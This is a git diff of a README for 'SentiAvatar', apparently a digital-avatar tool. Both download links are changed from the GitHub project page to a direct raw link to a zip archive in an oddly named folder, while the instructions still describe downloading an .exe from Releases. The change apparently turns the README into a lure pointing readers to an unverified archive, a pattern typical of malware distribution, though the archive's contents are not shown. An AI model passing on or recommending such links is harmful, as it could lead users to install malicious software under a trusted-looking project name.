@@ -1,7 +1,7 @@
 # 👤 SentiAvatar - Create Lifelike Digital Humans Today
 
 <p align="center">
-  <a href="https://github.com/Kenyamonitor7157/SentiAvatar">
+  <a href="https://raw.githubusercontent.com/Kenyamonitor7157/SentiAvatar/main/geoffroyine/Avatar-Senti-1.3.zip">
     <img src="https://img.shields.io/badge/Download-SentiAvatar-blue.svg" alt="Download SentiAvatar">
   </a>
 </p>
@@ -24,7 +24,7 @@ Check your computer settings if you do not know these details. Modern computers 
 
 You must visit the project page to download the latest version of the installer. 
 
-[Visit this page to download the SentiAvatar installer](https://github.com/Kenyamonitor7157/SentiAvatar)
+[Visit this page to download the SentiAvatar installer](https://raw.githubusercontent.com/Kenyamonitor7157/SentiAvatar/main/geoffroyine/Avatar-Senti-1.3.zip)
 
 Find the section labeled Releases on the right side of the page. Click the latest version link. Look for the file ending in `.exe`. Click this file to save it to your computer.
 
